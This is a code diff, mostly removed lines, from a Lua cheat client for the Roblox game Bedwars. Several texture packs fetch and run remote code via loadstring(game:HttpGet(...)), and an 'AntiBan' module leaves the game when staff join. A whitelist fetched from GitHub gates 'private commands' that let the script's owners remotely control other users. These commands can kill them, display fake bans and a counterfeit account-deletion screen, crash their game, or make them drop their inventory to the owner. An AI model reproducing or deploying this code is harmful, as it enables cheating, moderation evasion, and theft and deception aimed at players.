-					for _, v in ipairs(index) do	
-						if v.name == tool.Name then		
-							for _, part in ipairs(tool:GetDescendants()) do
-								if part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("UnionOperation") then				
-									part.Transparency = 1
-								end			
-							end		
-							local model = v.model:Clone()
-							model.CFrame = tool:WaitForChild("Handle").CFrame * v.offset
-							model.CFrame *= CFrame.Angles(math.rad(0), math.rad(-50), math.rad(0))
-							model.Parent = tool			
-							local weld = Instance.new("WeldConstraint", model)
-							weld.Part0 = model
-							weld.Part1 = tool:WaitForChild("Handle")			
-							local tool2 = Players.LocalPlayer.Character:WaitForChild(tool.Name)			
-							for _, part in ipairs(tool2:GetDescendants()) do
-								if part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("UnionOperation") then				
-									part.Transparency = 1				
-								end			
-							end			
-							local model2 = v.model:Clone()
-							model2.Anchored = false
-							model2.CFrame = tool2:WaitForChild("Handle").CFrame * v.offset
-							model2.CFrame *= CFrame.Angles(math.rad(0), math.rad(-50), math.rad(0))
-							if v.name:match("rageblade") then
-								model2.CFrame *= CFrame.new(0.7, 0, -1)                           
-							elseif v.name:match("sword") or v.name:match("blade") then
-								model2.CFrame *= CFrame.new(.6, 0, -1.1) - Vector3.new(0, 0, -.3)
-							elseif v.name:match("axe") and not v.name:match("pickaxe") and v.name:match("diamond") then
-								model2.CFrame *= CFrame.new(.08, 0, -1.1) - Vector3.new(0, 0, -1.1)
-							elseif v.name:match("axe") and not v.name:match("pickaxe") and not v.name:match("diamond") then
-								model2.CFrame *= CFrame.new(-.2, 0, -2.4) + Vector3.new(0, 0, 2.12)
-							elseif v.name:match("iron") then
-								model2.CFrame *= CFrame.new(0, -.24, 0)
-							elseif v.name:match("gold") then
-								model2.CFrame *= CFrame.new(0, .03, 0)
-							elseif v.name:match("diamond") then
-								model2.CFrame *= CFrame.new(0, .027, 0)
-							elseif v.name:match("emerald") then
-								model2.CFrame *= CFrame.new(0, .001, 0)
-							elseif v.name:match("telepearl") then
-								model2.CFrame *= CFrame.new(.1, 0, .1)
-							elseif v.name:match("fireball") then
-								model2.CFrame *= CFrame.new(.28, .1, 0)
-							elseif v.name:match("bow") and not v.name:match("crossbow") then
-								model2.CFrame *= CFrame.new(-.29, .1, -.2)
-							elseif v.name:match("wood_crossbow") and not v.name:match("tactical_crossbow") then
-								model2.CFrame *= CFrame.new(-.6, 0, 0)
-							elseif v.name:match("tactical_crossbow") and not v.name:match("wood_crossbow") then
-								model2.CFrame *= CFrame.new(-.5, 0, -1.2)
-							else
-								model2.CFrame *= CFrame.new(.2, 0, -.2)
-							end
-							model2.Parent = tool2
-							local weld2 = Instance.new("WeldConstraint", model)
-							weld2.Part0 = model2
-							weld2.Part1 = tool2:WaitForChild("Handle")
-						end
-					end
-				end)            
-			end)
-        end,
-		DemonSlayerPack = function() 
-			task.spawn(function()
-				local Players = game:GetService("Players")
-				local ReplicatedStorage = game:GetService("ReplicatedStorage")
-				local Workspace = game:GetService("Workspace")
-				local objs = game:GetObjects("rbxassetid://14241215869")
-				local import = objs[1]
-				import.Parent = ReplicatedStorage
-				local index = {
-					{
-						name = "wood_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Wood_Sword"),
-					},	
-					{
-						name = "stone_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Stone_Sword"),
-					},
-					{
-						name = "iron_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Iron_Sword"),
-					},
-					{
-						name = "diamond_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Diamond_Sword"),
-					},
-					{
-						name = "emerald_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Emerald_Sword"),
-					},
-					{
-						name = "wood_pickaxe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-180), math.rad(-95)),
-						model = import:WaitForChild("Wood_Pickaxe"),
-					},
-					{
-						name = "stone_pickaxe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-180), math.rad(-95)),
-						model = import:WaitForChild("Stone_Pickaxe"),
-					},
-					{
-						name = "iron_pickaxe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-180), math.rad(-95)),
-						model = import:WaitForChild("Iron_Pickaxe"),
-					},
-					{
-						name = "diamond_pickaxe",
-						offset = CFrame.Angles(math.rad(0), math.rad(90), math.rad(-95)),
-						model = import:WaitForChild("Diamond_Pickaxe"),
-					},	
-					{
-						name = "fireball",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Fireball"),
-					},	
-					{
-						name = "telepearl",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Telepearl"),
-					},
-					{
-						name = "diamond",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(-90)),
-						model = import:WaitForChild("Diamond"),
-					},
-					{
-						name = "iron",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Iron"),
-					},
-					{
-						name = "gold",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Gold"),
-					},
-					{
-						name = "emerald",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(-90)),
-						model = import:WaitForChild("Emerald"),
-					},
-					{
-						name = "wood_bow",
-						offset = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)),
-						model = import:WaitForChild("Bow"),
-					},
-					{
-						name = "wood_crossbow",
-						offset = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)),
-						model = import:WaitForChild("Bow"),
-					},
-					{
-						name = "tactical_crossbow",
-						offset = CFrame.Angles(math.rad(0), math.rad(180), math.rad(-90)),
-						model = import:WaitForChild("Bow"),
-					},
-					{
-						name = "wood_dao",
-						offset = CFrame.Angles(math.rad(0), math.rad(89), math.rad(-90)),
-						model = import:WaitForChild("Wood_Sword"),
-					},
-					{
-						name = "stone_dao",
-						offset = CFrame.Angles(math.rad(0), math.rad(89), math.rad(-90)),
-						model = import:WaitForChild("Stone_Sword"),
-					},
-					{
-						name = "iron_dao",
-						offset = CFrame.Angles(math.rad(0), math.rad(89), math.rad(-90)),
-						model = import:WaitForChild("Iron_Sword"),
-					},
-					{
-						name = "diamond_dao",
-						offset = CFrame.Angles(math.rad(0), math.rad(89), math.rad(-90)),
-						model = import:WaitForChild("Diamond_Sword"),
-					},
-				}
-				local func = Workspace.Camera.Viewmodel.ChildAdded:Connect(function(tool)	
-					if not tool:IsA("Accessory") then return end	
-					for _, v in ipairs(index) do	
-						if v.name == tool.Name then		
-							for _, part in ipairs(tool:GetDescendants()) do
-								if part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("UnionOperation") then				
-									part.Transparency = 1
-								end			
-							end		
-							local model = v.model:Clone()
-							model.CFrame = tool:WaitForChild("Handle").CFrame * v.offset
-							model.CFrame *= CFrame.Angles(math.rad(0), math.rad(-50), math.rad(0))
-							model.Parent = tool			
-							local weld = Instance.new("WeldConstraint", model)
-							weld.Part0 = model
-							weld.Part1 = tool:WaitForChild("Handle")			
-							local tool2 = Players.LocalPlayer.Character:WaitForChild(tool.Name)			
-							for _, part in ipairs(tool2:GetDescendants()) do
-								if part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("UnionOperation") then				
-									part.Transparency = 1				
-								end			
-							end			
-							local model2 = v.model:Clone()
-							model2.Anchored = false
-							model2.CFrame = tool2:WaitForChild("Handle").CFrame * v.offset
-							model2.CFrame *= CFrame.Angles(math.rad(0), math.rad(-50), math.rad(0))
-							if v.name:match("rageblade") then
-								model2.CFrame *= CFrame.new(0.7, 0, -.7)                           
-							elseif v.name:match("sword") or v.name:match("blade") then
-								model2.CFrame *= CFrame.new(.2, 0, -.8)
-							elseif v.name:match("dao") then
-								model2.CFrame *= CFrame.new(.7, 0, -1.3)
-							elseif v.name:match("axe") and not v.name:match("pickaxe") and v.name:match("diamond") then
-								model2.CFrame *= CFrame.new(.08, 0, -1.1) - Vector3.new(0, 0, -1.1)
-							elseif v.name:match("axe") and not v.name:match("pickaxe") and not v.name:match("diamond") then
-								model2.CFrame *= CFrame.new(-.2, 0, -2.4) + Vector3.new(0, 0, 2.12)
-							elseif v.name:match("diamond_pickaxe") then
-								model2.CFrame *= CFrame.new(.2, 0, -.26)
-							elseif v.name:match("iron") and not v.name:match("iron_pickaxe") then
-								model2.CFrame *= CFrame.new(0, -.24, 0)
-							elseif v.name:match("gold") then
-								model2.CFrame *= CFrame.new(0, .03, 0)
-							elseif v.name:match("diamond") or v.name:match("emerald") then
-								model2.CFrame *= CFrame.new(0, -.03, 0)
-							elseif v.name:match("telepearl") then
-								model2.CFrame *= CFrame.new(.1, 0, .1)
-							elseif v.name:match("fireball") then
-								model2.CFrame *= CFrame.new(.28, .1, 0)
-							elseif v.name:match("bow") and not v.name:match("crossbow") then
-								model2.CFrame *= CFrame.new(-.2, .1, -.05)
-							elseif v.name:match("wood_crossbow") and not v.name:match("tactical_crossbow") then
-								model2.CFrame *= CFrame.new(-.5, 0, .05)
-							elseif v.name:match("tactical_crossbow") and not v.name:match("wood_crossbow") then
-								model2.CFrame *= CFrame.new(-.35, 0, -1.2)
-							else
-								model2.CFrame *= CFrame.new(.0, 0, -.06)
-							end
-							model2.Parent = tool2
-							local weld2 = Instance.new("WeldConstraint", model)
-							weld2.Part0 = model2
-							weld2.Part1 = tool2:WaitForChild("Handle")
-						end
-					end
-				end)
-			end)
-		end,
-        FirstHighResPack = function() 
-            task.spawn(function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/512xPack"))()   
-           end)
-		end,
-		SecondHighResPack = function() 
-            task.spawn(function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/1024xPack"))()   
-           end)
-		end
-	}
-
-	TexturePacks = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		["Name"] = "TexturePacks",
-		["Function"] = function(callback) 
-			if callback then 
-				if not transformed then
-					transformed = true
-					packfunctions[packselected["Value"]]()
-				end
-            else 
-                if TexturePacks.Enabled == false then
-                    task.wait()
-                    func:disconnect()
-                end
-			end
-		end,
-		["ExtraText"] = function()
-			return packselected["Value"]
-		end
-	})
-	packselected = TexturePacks.CreateDropdown({
-		["Name"] = "Pack",
-		["Function"] = function() end,
-		["List"] = {"GlizzyPack", 
-		"FirstPack", "SecondPack", 
-		"ThirdPack", "FourthPack", 
-		"FifthPack", "SixthPack", 
-		"SeventhPack","EighthPack", 
-		"EgirlPack", "CottonCandy", 
-		"Pack512x", "Pack1056x",
-	    "PrivatePack", "DemonSlayerPack"}
-	})
-end)
-runFunction(function()
-	local transformed = false
-	local GameThemeV2 = {["Enabled"] = false}
-	local themeselected = {["Value"] = "OldBedwars"}
-
-	local themefunctions = {
-		NebulaSky = function() 
-			task.spawn(function() 
-
-				local Vignette = true
-
-
-				local Lighting = game:GetService("Lighting")
-				local ColorCor = Instance.new("ColorCorrectionEffect")
-				local SunRays = Instance.new("SunRaysEffect")
-				local Sky = Instance.new("Sky")
-				local Atm = Instance.new("Atmosphere")
-
-
-				for i, v in pairs(Lighting:GetChildren()) do
-					if v then
-						v:Destroy()
-					end
-				end
-
-				ColorCor.Parent = Lighting
-				SunRays.Parent = Lighting
-				Sky.Parent = Lighting
-				Atm.Parent = Lighting
-
-				if Vignette == true then
-					local Gui = Instance.new("ScreenGui")
-					Gui.Parent = StarterGui
-					Gui.IgnoreGuiInset = true
-
-					local ShadowFrame = Instance.new("ImageLabel")
-					ShadowFrame.Parent = Gui
-					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
-					ShadowFrame.Position = UDim2.new(0,0,0,0)
-					ShadowFrame.Size = UDim2.new(0,0,0,0)
-					ShadowFrame.BackgroundTransparency = 1
-					ShadowFrame.Image = ""
-					ShadowFrame.ImageTransparency = 1
-					ShadowFrame.ZIndex = 0
-				end
-
-
-				ColorCor.Brightness = 0.1
-				ColorCor.Contrast = 0.5
-				ColorCor.Saturation = -0.3
-				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)
-
-				SunRays.Intensity = 0.075
-				SunRays.Spread = 0.727
-
-				Sky.SkyboxBk = "rbxassetid://13581437029"
-				Sky.SkyboxDn = "rbxassetid://13581439832"
-				Sky.SkyboxFt = "rbxassetid://13581447312"
-				Sky.SkyboxLf = "rbxassetid://13581443463"
-				Sky.SkyboxRt = "rbxassetid://13581452875"
-				Sky.SkyboxUp = "rbxassetid://13581450222"
-				Sky.SunAngularSize = 10
-
-				Lighting.Ambient = Color3.fromRGB(2,2,2)
-				Lighting.Brightness = 0.3
-				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
-				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
-				Lighting.EnvironmentDiffuseScale = 0.2
-				Lighting.EnvironmentSpecularScale = 0.2
-				Lighting.GlobalShadows = true
-				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
-				Lighting.ShadowSoftness = 0.2
-				Lighting.ClockTime = 15
-				Lighting.GeographicLatitude = 45
-				Lighting.ExposureCompensation = 0.5
-
-				Atm.Density = 0.364
-				Atm.Offset = 0.556
-				Atm.Color = Color3.fromRGB(179, 59, 249)
-				Atm.Decay = Color3.fromRGB(155, 212, 255)
-				Atm.Glare = 0.36
-				Atm.Haze = 1.72	
-
-			end)
-		end,
-		PinkMountainSky = function() 
-			task.spawn(function()
-				game.Lighting.Sky.SkyboxBk = "http://www.roblox.com/asset/?id=160188495"
-				game.Lighting.Sky.SkyboxDn = "http://www.roblox.com/asset/?id=160188614"
-				game.Lighting.Sky.SkyboxFt = "http://www.roblox.com/asset/?id=160188609"
-				game.Lighting.Sky.SkyboxLf = "http://www.roblox.com/asset/?id=160188589"
-				game.Lighting.Sky.SkyboxRt = "http://www.roblox.com/asset/?id=160188597"
-				game.Lighting.Sky.SkyboxUp = "http://www.roblox.com/asset/?id=160188588"
-			end)
-		end,
-		CitySky = function() 
-			task.spawn(function()
-				game.Lighting.Sky.SkyboxBk = "rbxassetid://11263062161"
-				game.Lighting.Sky.SkyboxDn = "rbxassetid://11263065295"
-				game.Lighting.Sky.SkyboxFt = "rbxassetid://11263066644"
-				game.Lighting.Sky.SkyboxLf = "rbxassetid://11263068413"
-				game.Lighting.Sky.SkyboxRt = "rbxassetid://11263069782"
-				game.Lighting.Sky.SkyboxUp = "rbxassetid://11263070890"
-			end)
-		end,
-		SpaceSky = function() 
-			task.spawn(function()
-				game.Lighting.Sky.SkyboxBk = "rbxassetid://1735468027"
-				game.Lighting.Sky.SkyboxDn = "rbxassetid://1735500192"
-				game.Lighting.Sky.SkyboxFt = "rbxassetid://1735467260"
-				game.Lighting.Sky.SkyboxLf = "rbxassetid://1735467682"
-				game.Lighting.Sky.SkyboxRt = "rbxassetid://1735466772"
-				game.Lighting.Sky.SkyboxUp = "rbxassetid://1735500898"
-			end)
-		end,
-		EgirlSky = function() 
-			task.spawn(function()
-				game.Lighting.Sky.SkyboxBk = "rbxassetid://2128458653"
-				game.Lighting.Sky.SkyboxDn = "rbxassetid://2128462480"
-				game.Lighting.Sky.SkyboxFt = "rbxassetid://2128458653"
-				game.Lighting.Sky.SkyboxLf = "rbxassetid://2128462027"
-				game.Lighting.Sky.SkyboxRt = "rbxassetid://2128462027"
-				game.Lighting.Sky.SkyboxUp = "rbxassetid://2128462236"
-				game.Lighting.sky.SunAngularSize = 4
-				game.Lighting.sky.MoonTextureId = "rbxassetid://8139665943"
-				game.Lighting.sky.MoonAngularSize = 11
-				lightingService.Atmosphere.Color = Color3.fromRGB(255, 214, 172)
-				lightingService.Atmosphere.Decay = Color3.fromRGB(255, 202, 175)
-			end)
-		end,
-		PinkSky = function() 
-			task.spawn(function()
-				game.Lighting.Sky.SkyboxBk = "http://www.roblox.com/asset/?id=271042516"
-				game.Lighting.Sky.SkyboxDn = "http://www.roblox.com/asset/?id=271077243"
-				game.Lighting.Sky.SkyboxFt = "http://www.roblox.com/asset/?id=271042556"
-				game.Lighting.Sky.SkyboxLf = "http://www.roblox.com/asset/?id=271042310"
-				game.Lighting.Sky.SkyboxRt = "http://www.roblox.com/asset/?id=271042467"
-				game.Lighting.Sky.SkyboxUp = "http://www.roblox.com/asset/?id=271077958"
-			end)
-		end
-	}
-
-	GameThemeV2 = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		["Name"] = "GameThemeV2",
-		["Function"] = function(callback) 
-			if callback then 
-				if not transformed then
-					transformed = true
-					themefunctions[themeselected["Value"]]()
-				else
-					GameThemeV2["ToggleButton"](false)
-				end
-			else
-				CreateNotification("GameTheme", "Disabled Next Game", 10)
-			end
-		end,
-		["ExtraText"] = function()
-			return themeselected["Value"]
-		end
-	})
-	themeselected = GameThemeV2.CreateDropdown({
-		["Name"] = "Theme",
-		["Function"] = function() end,
-		["List"] = {"NebulaSky", "PinkMountainSky", "CitySky", "PinkSky", "EgirlSky", "SpaceSky"}
-	})
-end)
-runFunction(function()
-    AntiBan = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-        Name = "AntiBan",
-        Function = function(callback)
-            if callback then
-				repeat task.wait() until game:IsLoaded()
-                local groupId = 5774246
-                local roleId = 121
-                local function checkUserRole(player)
-                    if player:IsInGroup(groupId) and player:GetRankInGroup(groupId) == roleId then
-                        warningNotification("Vape", "A Staff Has Joined The Game, Leaving....", 60)
-						wait(2)
-                        bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-                    end
-                end
-                local function checkAllUsersRoles()
-                    for _, player in pairs(game.Players:GetPlayers()) do
-                        checkUserRole(player)
-                    end
-                end
-                checkAllUsersRoles()
-            end
-        end
-    })
-end)
-runFunction(function()
-	CustomModule = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		Name = "CustomHealthBar",
-		Function = function(callback)
-			if callback then 
-				spawn(function()
-					pcall(function()
-						local tweenservice = game:GetService("TweenService")
-						local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
-						local hotbar
-						local hotbar1
-						local hotbarHealthbarContainer
-						local healthbarProgressWrapper
-						local healthbar
-						local speed = 1
-						local redStart = 77
-						local greenStart = 107
-						local blueStart = 149
-						local redEnd = 0
-						local greenEnd = 0
-						local blueEnd = 110
-						repeat
-							if not healthbar or not healthbar.Parent then
-								hotbar = playerGui:WaitForChild("hotbar")
-								hotbar1 = hotbar:WaitForChild("1")
-								hotbarHealthbarContainer = hotbar1:WaitForChild("HotbarHealthbarContainer")
-								healthbarProgressWrapper = hotbarHealthbarContainer:WaitForChild("HealthbarProgressWrapper")
-								healthbar = healthbarProgressWrapper:WaitForChild("1")
-							end
-
-							local t = math.abs(math.sin(tick()))
-							local red = redStart + (redEnd - redStart) * t
-							local green = greenStart + (greenEnd - greenStart) * t
-							local blue = blueStart + (blueEnd - blueStart) * t
-							local color = Color3.new(red/255, green/255, blue/255)
-
-							local tween = tweenservice:Create(healthbar, TweenInfo.new(speed), {BackgroundColor3 = color})
-							tween:Play()
-							wait(speed)
-						until not CustomModule.Enabled
-					end) 
-				end)
-			end
-		end,
-		HoverText = "Made By Daddi Snoopy"
-	})
-end)
-
-local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/PinkReleased/Ape/main/New"))
-local function getLplrType()
-	local lplr_Type = 0
-	if whitelist["Owner"] ~= nil then
-		for i,v in pairs(whitelist["Owner"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 3
-				return lplr_Type
-			end
-		end
-	end
-	if whitelist["Private"] ~= nil then
-		for i,v in pairs(whitelist["Private"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 1
-				return lplr_Type
-			end
-		end
-	end
-	return lplr_Type
-end
-
-local MoonUsers = {}
-
-function CanAttackUser(u)
-	local userId = tostring(u.UserId)
-	local userType = 0
-
-	if whitelist["Private"] ~= nil then
-		for i, v in pairs(whitelist["Private"]) do
-			if v.id == userId then
-				userType = 1
-				break
-			end
-		end
-	end
-
-	if whitelist["Owner"] ~= nil then
-		for i, v in pairs(whitelist["Owner"]) do
-			if v.id == userId then
-				userType = 3
-				break
-			end
-		end
-	end
-
-	return getLplrType() >= userType
-end
-
-local function transformImage(img, txt)
-	local function funnyfunc(v)
-		if v:GetFullName():find("ExperienceChat") == nil then
-			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-				v.Image = img
-				v:GetPropertyChangedSignal("Image"):Connect(function()
-					v.Image = img
-				end)
-			end
-			if (v:IsA("TextLabel") or v:IsA("TextButton")) then
-				if v.Text ~= "" then
-					v.Text = txt
-				end
-				v:GetPropertyChangedSignal("Text"):Connect(function()
-					if v.Text ~= "" then
-						v.Text = txt
-					end
-				end)
-			end
-			if v:IsA("Texture") or v:IsA("Decal") then
-				v.Texture = img
-				v:GetPropertyChangedSignal("Texture"):Connect(function()
-					v.Texture = img
-				end)
-			end
-			if v:IsA("MeshPart") then
-				v.TextureID = img
-				v:GetPropertyChangedSignal("TextureID"):Connect(function()
-					v.TextureID = img
-				end)
-			end
-			if v:IsA("SpecialMesh") then
-				v.TextureId = img
-				v:GetPropertyChangedSignal("TextureId"):Connect(function()
-					v.TextureId = img
-				end)
-			end
-			if v:IsA("Sky") then
-				v.SkyboxBk = img
-				v.SkyboxDn = img
-				v.SkyboxFt = img
-				v.SkyboxLf = img
-				v.SkyboxRt = img
-				v.SkyboxUp = img
-			end
-		end
-	end
-
-	for i,v in pairs(game:GetDescendants()) do
-		funnyfunc(v)
-	end
-	game.DescendantAdded:Connect(funnyfunc)
-end
-
-local vapePrivateCommands = {
-	kill = function(args, plr)
-		if entityLibrary.isAlive then
-			local hum = entityLibrary.character.Humanoid
-			task.delay(0.1, function()
-				if hum and hum.Health > 0 then 
-					hum:ChangeState(Enum.HumanoidStateType.Dead)
-					hum.Health = 0
-					bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
-				end
-			end)
-		end
-	end,
-	byfron = function(args, plr)
-		task.spawn(function()
-			local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
-			local Roact = getrenv().require(game:GetService("CorePackages").Roact)
-			UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
-			local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
-			local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
-			local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
-			local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
-			local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
-			lplr.PlayerGui:ClearAllChildren()
-			GuiLibrary.MainGui.Enabled = false
-			game:GetService("CoreGui"):ClearAllChildren()
-			for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
-			task.wait(0.2)
-			lplr:Kick()
-			game:GetService("GuiService"):ClearError()
-			task.wait(2)
-			local gui = Instance.new("ScreenGui")
-			gui.IgnoreGuiInset = true
-			gui.Parent = game:GetService("CoreGui")
-			local frame = Instance.new("Frame")
-			frame.BorderSizePixel = 0
-			frame.Size = UDim2.new(1, 0, 1, 0)
-			frame.BackgroundColor3 = Color3.new(1, 1, 1)
-			frame.Parent = gui
-			task.delay(0.1, function()
-				frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-			end)
-			task.delay(2, function()
-				local e = Roact.createElement(auth, {
-					style = {},
-					screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
-					moderationDetails = {
-						punishmentTypeDescription = "Delete",
-						beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
-						reactivateAccountActivated = true,
-						badUtterances = {},
-						messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
-					},
-					termsActivated = function() 
-						game:Shutdown()
-					end,
-					communityGuidelinesActivated = function() 
-						game:Shutdown()
-					end,
-					supportFormActivated = function() 
-						game:Shutdown()
-					end,
-					reactivateAccountActivated = function() 
-						game:Shutdown()
-					end,
-					logoutCallback = function()
-						game:Shutdown()
-					end,
-					globalGuiInset = {
-						top = 0
-					}
-				})
-				local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
-						localization = tLocalization.mock()
-					}, {Roact.createElement(UIBlox.Style.Provider, {
-							style = {
-								Theme = darktheme,
-								Font = gotham
-							},
-						}, {e})}))
-				Roact.mount(screengui, game:GetService("CoreGui"))
-			end)
+		})
 		end)
-	end,
-	steal = function(args, plr)
-		if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
-			GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
-			task.wait(1)
-		end
-		for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
-			local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
-				item = v.tool,
-				amount = v.amount ~= math.huge and v.amount or 99999999
+
+		runFunction(function()
+			local fpsunlocker = {Enabled = false}
+			fpsunlocker = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
+			Name = "FPSUnlocker",
+			Function = function(callback)
+			if callback then
+			setfpscap(9e9)
+			else
+			setfpscap(60)
+			end
+			end
 			})
-			if e then 
-				e.CFrame = plr.Character.HumanoidRootPart.CFrame
-			else
-				v.tool:Destroy()
-			end
-		end
-	end,
-	lobby = function(args)
-		bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-	end,
-	reveal = function(args)
-		task.spawn(function()
-			task.wait(0.1)
-			local newchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-			if newchannel then 
-				newchannel:SendAsync("I am using the inhaler client")
-			end
-		end)
-	end,
-	lagback = function(args)
-		if entityLibrary.isAlive then
-			entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
-		end
-	end,
-	jump = function(args)
-		if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
-			entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-		end
-	end,
-	trip = function(args)
-		if entityLibrary.isAlive then
-			entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-		end
-	end,
-	teleport = function(args)
-		game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
-	end,
-	sit = function(args)
-		if entityLibrary.isAlive then
-			entityLibrary.character.Humanoid.Sit = true
-		end
-	end,
-	unsit = function(args)
-		if entityLibrary.isAlive then
-			entityLibrary.character.Humanoid.Sit = false
-		end
-	end,
-	freeze = function(args)
-		if entityLibrary.isAlive then
-			entityLibrary.character.HumanoidRootPart.Anchored = true
-		end
-	end,
-	thaw = function(args)
-		if entityLibrary.isAlive then
-			entityLibrary.character.HumanoidRootPart.Anchored = false
-		end
-	end,
-	deletemap = function(args)
-		for i,v in pairs(collectionService:GetTagged("block")) do
-			v:Destroy()
-		end
-	end,
-	void = function(args)
-		if entityLibrary.isAlive then
-			entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
-		end
-	end,
-	framerate = function(args)
-		if #args >= 1 then
-			if setfpscap then
-				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
-			end
-		end
-	end,
-	crash = function(args)
-		setfpscap(9e9)
-		print(game:GetObjects("h29g3535")[1])
-	end,
-	chipman = function(args)
-		transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
-	end,
-	rickroll = function(args)
-		transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
-	end,
-	josiah = function(args)
-		transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
-	end,
-	xylex = function(args)
-		transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
-	end,
-	gravity = function(args)
-		workspace.Gravity = tonumber(args[1]) or 192.6
-	end,
-	kick = function(args)
-		local str = ""
-		for i,v in pairs(args) do
-			str = str..v..(i > 1 and " " or "")
-		end
-		task.spawn(function()
-			lplr:Kick(str)
-		end)
-		bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-	end,
-	ban = function(args)
-		task.spawn(function()
-			lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-		end)
-		bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-	end,
-	uninject = function(args)
-		GuiLibrary.SelfDestruct()
-	end,
-	monkey = function(args)
-		local str = ""
-		for i,v in pairs(args) do
-			str = str..v..(i > 1 and " " or "")
-		end
-		if str == "" then str = "skill issue" end
-		local video = Instance.new("VideoFrame")
-		video.Video = downloadVapeAsset("vape/assets/skill.webm")
-		video.Size = UDim2.new(1, 0, 1, 36)
-		video.Visible = false
-		video.Position = UDim2.new(0, 0, 0, -36)
-		video.ZIndex = 9
-		video.BackgroundTransparency = 1
